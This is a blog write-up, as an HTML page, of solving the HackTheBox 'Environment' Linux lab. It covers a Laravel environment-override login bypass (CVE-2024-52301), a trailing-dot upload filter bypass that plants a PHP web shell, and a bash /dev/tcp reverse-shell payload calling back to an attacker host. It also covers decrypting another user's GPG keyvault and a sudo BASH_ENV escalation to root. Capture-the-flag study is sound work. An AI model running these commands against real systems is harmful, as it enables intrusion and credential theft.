

<!DOCTYPE html>
<html lang="en" data-default-color-scheme=auto>



<head>
  <meta charset="UTF-8">

  <link rel="apple-touch-icon" sizes="76x76" href="/img/macabely.png">
  <link rel="icon" href="/img/macabely.png">
  

  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
  <meta http-equiv="x-ua-compatible" content="ie=edge">
  
  <meta name="theme-color" content="#2f4154">
  <meta name="author" content="Macabely">
  <meta name="keywords" content="">
  
    <meta name="description" content="My walkthrough in the Environment machine on HackTheBox">
<meta property="og:type" content="article">
<meta property="og:title" content="HTB Environment Machine (Medium)">
<meta property="og:url" content="https://xyz-macabely.github.io/2025/09/06/htb-m/environment/index.html">
<meta property="og:site_name" content="Macabely">
<meta property="og:description" content="My walkthrough in the Environment machine on HackTheBox">
<meta property="og:locale" content="en_US">
<meta property="og:image" content="https://xyz-macabely.github.io/images/htb-m/environment/1.png">
<meta property="article:published_time" content="2025-09-05T21:00:00.000Z">
<meta property="article:modified_time" content="2025-10-08T11:37:49.593Z">
<meta property="article:author" content="Macabely">
<meta property="article:tag" content="htb">
<meta property="article:tag" content="linux">
<meta property="article:tag" content="machines">
<meta property="article:tag" content="web">
<meta name="twitter:card" content="summary_large_image">
<meta name="twitter:image" content="https://xyz-macabely.github.io/images/htb-m/environment/1.png">
  
  
  
  <title>HTB Environment Machine (Medium) - Macabely</title>

  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />



  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />

  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />

  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />



<!-- 主题依赖的图标库，不要自行修改 -->
<!-- Do not modify the link that theme dependent icons -->

<link rel="stylesheet" href="//at.alicdn.com/t/c/font_1749284_5i9bdhy70f8.css">



<link rel="stylesheet" href="//at.alicdn.com/t/c/font_1736178_k526ubmyhba.css">


<link  rel="stylesheet" href="/css/main.css" />


  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
  
    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
  




  <script id="fluid-configs">
    var Fluid = window.Fluid || {};
    Fluid.ctx = Object.assign({}, Fluid.ctx)
    var CONFIG = {"hostname":"xyz-macabely.github.io","root":"/","version":"1.9.8","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":false,"follow_dnt":true,"baidu":null,"google":{"measurement_id":null},"tencent":{"sid":null,"cid":null},"leancloud":{"app_id":null,"app_key":null,"server_url":null,"path":"window.location.pathname","ignore_local":false},"umami":{"src":null,"website_id":null,"domains":null,"start_time":"2024-01-01T00:00:00.000Z","token":null,"api_server":null}},"search_path":"/local-search.xml","include_content_in_search":true};

    if (CONFIG.web_analytics.follow_dnt) {
      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
    }
  </script>
  <script  src="/js/utils.js" ></script>
  <script  src="/js/color-schema.js" ></script>
  


  
<meta name="generator" content="Hexo 8.0.0"></head>


<body>
  

  <header>
    

<div class="header-inner" style="height: 70vh;">
  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
  <div class="container">
    <a class="navbar-brand" href="/">
      <strong>Macabely</strong>
    </a>

    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
            data-target="#navbarSupportedContent"
            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
      <div class="animated-icon"><span></span><span></span><span></span></div>
    </button>

    <!-- Collapsible content -->
    <div class="collapse navbar-collapse" id="navbarSupportedContent">
      <ul class="navbar-nav ml-auto text-center">
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/" target="_self">
                <i class="iconfont icon-home-fill"></i>
                <span>Home</span>
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/about/" target="_self">
                <i class="iconfont icon-user-fill"></i>
                <span>About</span>
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="https://x.com/Macabely97021" target="_self">
                <i class="iconfont icon-twitter-fill"></i>
                <span></span>
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="https://www.linkedin.com/in/ali-hassan-02a479219" target="_self">
                <i class="iconfont icon-linkedin-fill"></i>
                <span></span>
              </a>
            </li>
          
        
        
          <li class="nav-item" id="search-btn">
            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
              <i class="iconfont icon-search"></i>
            </a>
          </li>
          
        
        
          <li class="nav-item" id="color-toggle-btn">
            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">
              <i class="iconfont icon-dark" id="color-toggle-icon"></i>
            </a>
          </li>
        
      </ul>
    </div>
  </div>
</nav>

  

<div id="banner" class="banner" parallax=true
     style="background: url('/null') no-repeat center center; background-size: cover;">
  <div class="full-bg-img">
    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
      <div class="banner-text text-center fade-in-up">
        <div class="h2">
          
            <span id="subtitle" data-typed-text="HTB Environment Machine (Medium)"></span>
          
        </div>

        
          
  <div class="mt-3">
    
    
  </div>

  <div class="mt-1">
    
      <span class="post-meta mr-2">
        <i class="iconfont icon-chart"></i>
        
          8k words
        
      </span>
    

    
      <span class="post-meta mr-2">
        <i class="iconfont icon-clock-fill"></i>
        
        
        
          67 mins
        
      </span>
    

    
    
  </div>


        
      </div>

      
    </div>
  </div>
</div>

</div>

  </header>

  <main>
    
      

<div class="container-fluid nopadding-x">
  <div class="row nomargin-x">
    <div class="side-col d-none d-lg-block col-lg-2">
      

    </div>

    <div class="col-lg-8 nopadding-x-md">
      <div class="container nopadding-x-md" id="board-ctn">
        <div id="board">
          <article class="post-content mx-auto">
            <h1 id="seo-header">HTB Environment Machine (Medium)</h1>
            
            
              <div class="markdown-body">
                
                <p><img src="/images/htb-m/environment/1.png" srcset="/img/loading.gif" lazyload></p>
<p>I’m gonna walk through how I solved the <strong>Environment</strong> machine. It’s a Linux machine, a <strong>medium</strong> one on HackTheBox.</p>
<h1 id="I-Reconnaissance"><a href="#I-Reconnaissance" class="headerlink" title="I Reconnaissance"></a>I Reconnaissance</h1><p>I start with a simple nmap scan <code>nmap -Pn -sV -T4 -p- -sC 10.10.11.67</code>:</p>
<p><img src="/images/htb-m/environment/Screenshot%202025-09-06%20175105.png" srcset="/img/loading.gif" lazyload></p>
<p>Port 80 and 22 are opened.</p>
<p>I grabbed the IP and setup the <code>/etc/hosts</code> file with it and the domain provided by the browser. I requested the domain and a single, simple page showed up:<br><img src="/images/htb-m/environment/Pasted%20image%2020250724160933.png" srcset="/img/loading.gif" lazyload></p>
<p>The page is literally empty and has nothing on, even the email join function at the bottom has nothing interesting to test for.<br>I opened the html source code to see if there are JS files that has anything interesting and i found this piece of code:</p>
<div class="code-wrapper"><pre><code class="hljs JAVASCRIPT"><span class="hljs-keyword">const</span> email = <span class="hljs-variable language_">document</span>.<span class="hljs-title function_">getElementById</span>(<span class="hljs-string">&#x27;email&#x27;</span>).<span class="hljs-property">value</span>;
<span class="hljs-keyword">const</span> csrfToken = <span class="hljs-variable language_">document</span>.<span class="hljs-title function_">getElementsByName</span>(<span class="hljs-string">&quot;_token&quot;</span>)[<span class="hljs-number">0</span>].<span class="hljs-property">value</span>;
<span class="hljs-keyword">const</span> responseMessage = <span class="hljs-variable language_">document</span>.<span class="hljs-title function_">getElementById</span>(<span class="hljs-string">&#x27;responseMessage&#x27;</span>);

<span class="hljs-keyword">try</span> &#123;
    <span class="hljs-keyword">const</span> response = <span class="hljs-keyword">await</span> <span class="hljs-title function_">fetch</span>(<span class="hljs-string">&#x27;/mailing&#x27;</span>, &#123;
        <span class="hljs-attr">method</span>: <span class="hljs-string">&#x27;POST&#x27;</span>,
        <span class="hljs-attr">headers</span>: &#123;
            <span class="hljs-string">&#x27;Content-Type&#x27;</span>: <span class="hljs-string">&#x27;application/x-www-form-urlencoded&#x27;</span>,
        &#125;,
                <span class="hljs-attr">body</span>: <span class="hljs-string">&quot;email=&quot;</span> + email + <span class="hljs-string">&quot;&amp;_token=&quot;</span> + csrfToken,
    &#125;);

    <span class="hljs-keyword">if</span> (response.<span class="hljs-property">ok</span>) &#123;
        <span class="hljs-keyword">const</span> data = <span class="hljs-keyword">await</span> response.<span class="hljs-title function_">json</span>();
        responseMessage.<span class="hljs-property">textContent</span> = data.<span class="hljs-property">message</span>; <span class="hljs-comment">// Display success message</span>
        responseMessage.<span class="hljs-property">style</span>.<span class="hljs-property">color</span> = <span class="hljs-string">&#x27;greenyellow&#x27;</span>;
    &#125; <span class="hljs-keyword">else</span> &#123;
        <span class="hljs-keyword">const</span> errorData = <span class="hljs-keyword">await</span> response.<span class="hljs-title function_">json</span>();
        responseMessage.<span class="hljs-property">textContent</span> = errorData.<span class="hljs-property">message</span> || <span class="hljs-string">&#x27;An error occurred.&#x27;</span>;
        responseMessage.<span class="hljs-property">style</span>.<span class="hljs-property">color</span> = <span class="hljs-string">&#x27;red&#x27;</span>;
    &#125;
&#125; <span class="hljs-keyword">catch</span> (error) &#123;
    responseMessage.<span class="hljs-property">textContent</span> = <span class="hljs-string">&#x27;Failed to send the request.&#x27;</span>;
    responseMessage.<span class="hljs-property">style</span>.<span class="hljs-property">color</span> = <span class="hljs-string">&#x27;red&#x27;</span>;
&#125;</code></pre></div>
<p>This code is related to the email join function. It simply does the following</p>
<ol>
<li>grab the <code>email &amp; _token</code> parameter values and assign it to <code>email</code>, <code>csrfToken</code> variables</li>
<li>send a POST req to <code>/mailing</code> endpoint with <code>email</code>, <code>_token</code> parameters in the body with the values of the variables that were assigned before</li>
<li>The response comes in a JSON format. If it successful, prints a success message and if it’s not, you get an error</li>
</ol>
<p>The most important thing here is the <code>/mailing</code> endpoint. I request it to see what it has and i got surprised with this error:</p>
<p><img src="/images/htb-m/environment/Pasted%20image%2020250724162705.png" srcset="/img/loading.gif" lazyload></p>
<p>The application is running <code>Laravel</code> at the backend (an open-source PHP-based web framework for building web applications) And we got a little nice debugger left opened here, that we can use to see a detailed info about errors that also leaks some of the source code.<br>Even with that info we got from the debugger. i’m at a dead end now, the page has nothing.  </p>
<p>When you face these types of situations, then you should know it’s <strong>fuzzing time</strong>. Surely the application has something right? Or there will be no point of making this machine. So you keep knocking on the site until something is hopefully opened.  </p>
<p>I used <code>ffuf</code> for this mission with a <code>common.txt</code> wordlist: <a target="_blank" rel="noopener" href="https://github.com/danielmiessler/SecLists/blob/master/Discovery/Web-Content/common.txt">danielmiessler&#x2F;SecLists</a>.<br>I got some results.</p>
<p><img src="/images/htb-m/environment/Pasted%20image%2020250724163958.png" srcset="/img/loading.gif" lazyload></p>
<h1 id="II-Analyze"><a href="#II-Analyze" class="headerlink" title="II Analyze"></a>II Analyze</h1><p>The most important endpoint here is the <code>/login</code> endpoint. The rest was either forbidden or empty.<br>By navigating to the <code>/login</code> endpoint, we see a simple login page (strange, isn’t it? xD) </p>
<p><img src="/images/htb-m/environment/Pasted%20image%2020250724164255.png" srcset="/img/loading.gif" lazyload></p>
<p>My only focus here is to somehow raise an error to see what the debugger will tell us. I made a login request with remember me option on, intercepted it with burp and tried to play with it a little bit.  </p>
<p>I tried a simple trick by adding <code>[]</code> after the parameter, PHP will convert the data type to be an array that way, which may cause an error since there server doesn’t expect an array to be here.</p>
<p><img src="/images/htb-m/environment/Pasted%20image%2020250724165028.png" srcset="/img/loading.gif" lazyload></p>
<p>As you can see we have a 500 internal server error here. right click on the request, choose show response in browser and paste the link in the browser.</p>
<p><img src="/images/htb-m/environment/Screenshot%202025-07-24%20165414.png" srcset="/img/loading.gif" lazyload></p>
<p>We raised an error about <code>$keep_loogedin</code> being undefined (probably cause what i did). That part doesn’t really matter, cause it’s related to the <code>remember</code> parameter being True or False.  </p>
<p>If it’s true you will be logged in without adding your creds again, if it’s not you will add the creds in order to login. The thing is, we don’t even have any creds that we can use, that’s why this part not matter.  </p>
<p>In the other hand, the second part <code>if(App::environment() == &quot;preprod&quot;)</code> is huge information. The <code>QOL</code> (mentioned in the comment) it’s like a feature intended for development or testing modes that you can use to bypass the login process and get admin privilege (as mentioned in <code>(&#39;user_id&#39;, 1)</code> part) without authentication.  </p>
<p>I did a little bit of research, to see how i can bypass the login page with the help of the laravel version being disclosed at the top right. I found some CVEs related to that version, most importantly is <strong>CVE-2024-52301</strong>: <a target="_blank" rel="noopener" href="https://muneebdev.com/laravel-11-30-0-exploit/">Laravel 11.30.0 Exploit: Critical Vulnerabilities &amp; Protection</a>.  </p>
<p>The vulnerability happened when the <code>register_argc_argv</code> PHP directive left opened, that will lead the attackers to craft malicious query strings (parameter) that manipulate the application’s environment.  </p>
<p>I also found a POC for this: <a target="_blank" rel="noopener" href="https://github.com/Nyamort/CVE-2024-52301">Nyamort&#x2F;CVE-2024-52301</a>. The only thing you need to do is the add <code>--env</code> parameter with the environment mode mentioned at the error debugger (preprod)<br>The request will be like this:</p>
<p><img src="/images/htb-m/environment/Screenshot%202025-07-24%20171546.png" srcset="/img/loading.gif" lazyload></p>
<p>Once you logged in, you will see an upload function. We may get a web shell from it?</p>
<p><img src="/images/htb-m/environment/Pasted%20image%2020250724171840.png" srcset="/img/loading.gif" lazyload></p>
<p>I did upload a simple image, intercept the request with burp and tried testing for file upload attacks.</p>
<p><img src="/images/htb-m/environment/Pasted%20image%2020250724172804.png" srcset="/img/loading.gif" lazyload></p>
<h1 id="III-Exploit-webshell"><a href="#III-Exploit-webshell" class="headerlink" title="III Exploit (webshell)"></a>III Exploit (webshell)</h1><p>First i tried multiple extensions but it gave me <code>Invalid file detected</code> error. Then i fuzzed on extensions with this wordlist: <a target="_blank" rel="noopener" href="https://github.com/danielmiessler/SecLists/blob/master/Discovery/Web-Content/web-extensions.txt">Web Extensions</a> and found some that were accepted by the server (php7, phtml, …..etc) but all of them didn’t execute the shell command.  </p>
<p>While testing i figured out that when you add <code>.</code> at the end of the extension, it gets deleted by the server (e.g. <code>test.png.</code> &#x3D;&gt; <code>test.png</code>). And thats how you can bypass the filter by adding <code>.</code> at the end of the file (<code>shell.php.</code>)</p>
<p><img src="/images/htb-m/environment/Pasted%20image%2020250724173949.png" srcset="/img/loading.gif" lazyload alt="I left the image header cause the filter checks on the MimeType"></p>
<p>By going to the upload URL, adding the <code>cmd</code> parameter with value of <code>id</code> to see if our webshell is working</p>
<p><img src="/images/htb-m/environment/Pasted%20image%2020250724174336.png" srcset="/img/loading.gif" lazyload></p>
<h1 id="IV-Reverse-Shell"><a href="#IV-Reverse-Shell" class="headerlink" title="IV Reverse Shell"></a>IV Reverse Shell</h1><p>Now let’s turn it into a reverse one. You can get a reverse shell from a web shell by simply adding this payload in the <code>cmd</code> parameter: <code>bash -c &#39;bash -i &gt;&amp; /dev/tcp/&lt;IP&gt;/&lt;port&gt; 0&gt;&amp;1&#39;</code>. But you need first to establish a listener on the port that you will get a reverse shell on. By doing that you will successfully get a reverse shell:</p>
<p><img src="/images/htb-m/environment/Pasted%20image%2020250724175125.png" srcset="/img/loading.gif" lazyload alt="User Flag"></p>
<h1 id="V-Root"><a href="#V-Root" class="headerlink" title="V Root"></a>V Root</h1><p>As you can see, we have a backup file, i opened it and found <code>keyvault.gpg</code> file in it. From this file’s extension, this file is encrypted using GnuPG (GPG), a tool commonly used to encrypt and sign data. </p>
<p>I tried to decrypt the file with <code>--decrypt</code> flag</p>
<p><img src="/images/htb-m/environment/Pasted%20image%2020250724191408.png" srcset="/img/loading.gif" lazyload></p>
<p>As you can see the tool reading the keys from <code>/var/www/.gnupg</code> directory, which we don’t have access to it.</p>
<p>I kept searching and found out that when using GnuPG(GPG), you probably have a directory called <code>/.gnupg</code> That contains private&#x2F;public keys for encryption and decryption<br>&#x3D;&gt; <a target="_blank" rel="noopener" href="https://www.redhat.com/en/blog/getting-started-gpg">Getting started with GPG (GnuPG)</a>.<br>&#x3D;&gt; <a target="_blank" rel="noopener" href="https://medium.com/@acparas/gpg-quickstart-guide-d01f005ca99">GPG Quickstart Guide 🔒. I recently discovered GPG and how… | by Anton Paras | Medium</a>.</p>
<p>i found that directory (<code>/.gnupg</code>) in <code>/hish</code> directory. By navigating to it i found the following:</p>
<p><img src="/images/htb-m/environment/Pasted%20image%2020250724191623.png" srcset="/img/loading.gif" lazyload></p>
<p>There is a <code>/private-keys-v1.d</code> directory that is probably have the keys. We can use the <code>--homedir</code> flag to tell the tool to get <code>/.gnupg</code> from <code>/hish</code> directory instead of <code>/var/www</code>.  </p>
<p>I tried to decrypt the file that way and guess what happened, another error:</p>
<p><img src="/images/htb-m/environment/Pasted%20image%2020250724192233.png" srcset="/img/loading.gif" lazyload></p>
<p>We also don’t have write permission in <code>/hish</code> directory. To make the tool work properly, we need a place that we have write access to it. The best place came to my mind is <code>/tmp</code>  directory, where users has write access to it.  </p>
<ol>
<li><p>First you need to make a dir in <strong>&#x2F;tmp</strong>: <code>mkdir test</code>.</p>
</li>
<li><p>Copy the <code>.gnupg</code> from the <code>/hish</code> directory to the dir you created in <code>/tmp</code> directory.<br>Or you can just create and copy at the same time without needing to first point:<br><code>cp -r /home/hish/.gnupg /tmp/test</code></p>
</li>
<li><p>give it the right access: <code>chmod 755 test</code>.</p>
</li>
<li><p>lists the secret keys in the directory by using <code>--list-secret-keys</code> flag:<br><code>gpg --homedir test --list-secret-keys</code>. (you need to be at <code>/tmp</code> here)</p>
</li>
<li><p>decrypt the required file and use the <code>--output</code> flag to place the results in a file:<br><code>gpg --homedir test --output best.txt --decrypt /home/hish/backup/keyvault.gpg</code>.</p>
</li>
</ol>
<p><img src="/images/htb-m/environment/Pasted%20image%2020250724200243.png" srcset="/img/loading.gif" lazyload></p>
<p>Now we got our password that we can use to access the server as <strong>hish</strong> <code>ssh hish@10.10.11.67</code>.</p>
<p><img src="/images/htb-m/environment/Pasted%20image%2020250724200512.png" srcset="/img/loading.gif" lazyload></p>
<p>Usually we don’t have access to the <code>/root</code> directory, we need to escalate our privilege.<br>By executing this command: <code>sudo -l</code> to see if we have access on sudo command and what other commands that we have access to it.</p>
<p><img src="/images/htb-m/environment/Pasted%20image%2020250724200806.png" srcset="/img/loading.gif" lazyload></p>
<p>From this results, we have access on <code>systeminfo</code> script. and also the sudo confing keeps certain <strong>environment variables</strong> (<code>ENV</code>, <code>BASH_ENV</code>) to be accessed and used.  </p>
<p>The <code>BASH_ENV</code> is a life change in this exploit. from this we can create a malicious file that contains some bash code that will get us root privileges. And then we can source that file, by exporting it’s path to the <code>BASH_ENV</code> environment variable then run <code>systeminfo</code> script.  </p>
<p>The exploit will be the following:</p>
<ol>
<li><p>create a file: <code>echo -e &#39;#!/bin/bash\n/bin/bash -p&#39; &gt; test</code>.</p>
</li>
<li><p>give it execute permission: <code>chmod +x test</code>.</p>
</li>
<li><p>export the file path into <code>BASH_ENV</code> environment variable: <code>export BASH_ENV=test</code>. and that will do the following:<br><em>Tells bash to source our malicious file so that any new non-interactive shell is launched, our file gets executed first.</em></p>
</li>
<li><p>run the <code>systeminfo</code> script as sudo: <code>sudo /usr/bin/systeminfo</code>. And because <code>systeminfo</code> runs as a script, it’s is considered a <strong>non-interactive Bash shell</strong>. So bash will source the file set in <code>BASH_ENV</code> (our malicious file) before executing the script. That will likely prevent the <code>systeminfo</code> script from fully executing.</p>
</li>
</ol>
<p><img src="/images/htb-m/environment/Screenshot%202025-07-24%20204038.png" srcset="/img/loading.gif" lazyload alt="Root Flag"></p>

                
              </div>
            
            <hr/>
            <div>
              <div class="post-metas my-3">
  
    <div class="post-meta mr-3 d-flex align-items-center">
      <i class="iconfont icon-category"></i>
      

<span class="category-chains">
  
  
    
      <span class="category-chain">
        
  <a href="/categories/HTB/" class="category-chain-item">HTB</a>
  
  

      </span>
    
  
</span>

    </div>
  
  
    <div class="post-meta">
      <i class="iconfont icon-tags"></i>
      
        <a href="/tags/htb/" class="print-no-link">#htb</a>
      
        <a href="/tags/web/" class="print-no-link">#web</a>
      
        <a href="/tags/linux/" class="print-no-link">#linux</a>
      
        <a href="/tags/machines/" class="print-no-link">#machines</a>
      
    </div>
  
</div>


              

              
                <div class="post-prevnext my-3">
                  <article class="post-prev col-6">
                    
                    
                      <a href="/2025/09/28/ctfs/olympicsctf/" title="OlympicsCTF 2025">
                        <i class="iconfont icon-arrowleft"></i>
                        <span class="hidden-mobile">OlympicsCTF 2025</span>
                        <span class="visible-mobile">Previous</span>
                      </a>
                    
                  </article>
                  <article class="post-next col-6">
                    
                    
                      <a href="/2025/08/31/htb-m/planning/" title="HTB Planning Machine (Easy)">
                        <span class="hidden-mobile">HTB Planning Machine (Easy)</span>
                        <span class="visible-mobile">Next</span>
                        <i class="iconfont icon-arrowright"></i>
                      </a>
                    
                  </article>
                </div>
              
            </div>

            
          </article>
        </div>
      </div>
    </div>

    <div class="side-col d-none d-lg-block col-lg-2">
      
  <aside class="sidebar" style="margin-left: -1rem">
    <div id="toc">
  <p class="toc-header">
    <i class="iconfont icon-list"></i>
    <span>Table of Contents</span>
  </p>
  <div class="toc-body" id="toc-body"></div>
</div>



  </aside>


    </div>
  </div>
</div>





  



  



  



  



  







    

    
      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
      </a>
    

    
      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
     aria-hidden="true">
  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
    <div class="modal-content">
      <div class="modal-header text-center">
        <h4 class="modal-title w-100 font-weight-bold">Search</h4>
        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
          <span aria-hidden="true">&times;</span>
        </button>
      </div>
      <div class="modal-body mx-3">
        <div class="md-form mb-5">
          <input type="text" id="local-search-input" class="form-control validate">
          <label data-error="x" data-success="v" for="local-search-input">Keyword</label>
        </div>
        <div class="list-group" id="local-search-result"></div>
      </div>
    </div>
  </div>
</div>

    

    
  </main>

  <footer>
    <div class="footer-inner">
  
    <div class="footer-content">
       <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> 
    </div>
  
  
  
</div>

  </footer>

  <!-- Scripts -->
  
  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />

  <script>
    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
    NProgress.start()
    window.addEventListener('load', function() {
      NProgress.done();
    })
  </script>


<script  src="https://lib.baomitu.com/jquery/3.6.4/jquery.min.js" ></script>
<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
<script  src="/js/events.js" ></script>
<script  src="/js/plugins.js" ></script>


  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
  <script>
    (function (window, document) {
      var typing = Fluid.plugins.typing;
      var subtitle = document.getElementById('subtitle');
      if (!subtitle || !typing) {
        return;
      }
      var text = subtitle.getAttribute('data-typed-text');
      
        typing(text);
      
    })(window, document);
  </script>




  
    <script  src="/js/img-lazyload.js" ></script>
  




  
<script>
  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.20.1/tocbot.min.js', function() {
    var toc = jQuery('#toc');
    if (toc.length === 0 || !window.tocbot) { return; }
    var boardCtn = jQuery('#board-ctn');
    var boardTop = boardCtn.offset().top;

    window.tocbot.init(Object.assign({
      tocSelector     : '#toc-body',
      contentSelector : '.markdown-body',
      linkClass       : 'tocbot-link',
      activeLinkClass : 'tocbot-active-link',
      listClass       : 'tocbot-list',
      isCollapsedClass: 'tocbot-is-collapsed',
      collapsibleClass: 'tocbot-is-collapsible',
      scrollSmooth    : true,
      includeTitleTags: true,
      headingsOffset  : -boardTop,
    }, CONFIG.toc));
    if (toc.find('.toc-list-item').length > 0) {
      toc.css('visibility', 'visible');
    }

    Fluid.events.registerRefreshCallback(function() {
      if ('tocbot' in window) {
        tocbot.refresh();
        var toc = jQuery('#toc');
        if (toc.length === 0 || !tocbot) {
          return;
        }
        if (toc.find('.toc-list-item').length > 0) {
          toc.css('visibility', 'visible');
        }
      }
    });
  });
</script>


  <script src=https://lib.baomitu.com/clipboard.js/2.0.11/clipboard.min.js></script>

  <script>Fluid.plugins.codeWidget();</script>


  
<script>
  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/5.0.0/anchor.min.js', function() {
    window.anchors.options = {
      placement: CONFIG.anchorjs.placement,
      visible  : CONFIG.anchorjs.visible
    };
    if (CONFIG.anchorjs.icon) {
      window.anchors.options.icon = CONFIG.anchorjs.icon;
    }
    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
    var res = [];
    for (var item of el) {
      res.push('.markdown-body > ' + item.trim());
    }
    if (CONFIG.anchorjs.placement === 'left') {
      window.anchors.options.class = 'anchorjs-link-left';
    }
    window.anchors.add(res.join(', '));

    Fluid.events.registerRefreshCallback(function() {
      if ('anchors' in window) {
        anchors.removeAll();
        var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
        var res = [];
        for (var item of el) {
          res.push('.markdown-body > ' + item.trim());
        }
        if (CONFIG.anchorjs.placement === 'left') {
          anchors.options.class = 'anchorjs-link-left';
        }
        anchors.add(res.join(', '));
      }
    });
  });
</script>


  
<script>
  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
    Fluid.plugins.fancyBox();
  });
</script>


  <script>Fluid.plugins.imageCaption();</script>

  <script  src="/js/local-search.js" ></script>





<!-- 主题的启动项，将它保持在最底部 -->
<!-- the boot of the theme, keep it at the bottom -->
<script  src="/js/boot.js" ></script>


  

  <noscript>
    <div class="noscript-warning">Blog works best with JavaScript enabled</div>
  </noscript>
</body>
</html>
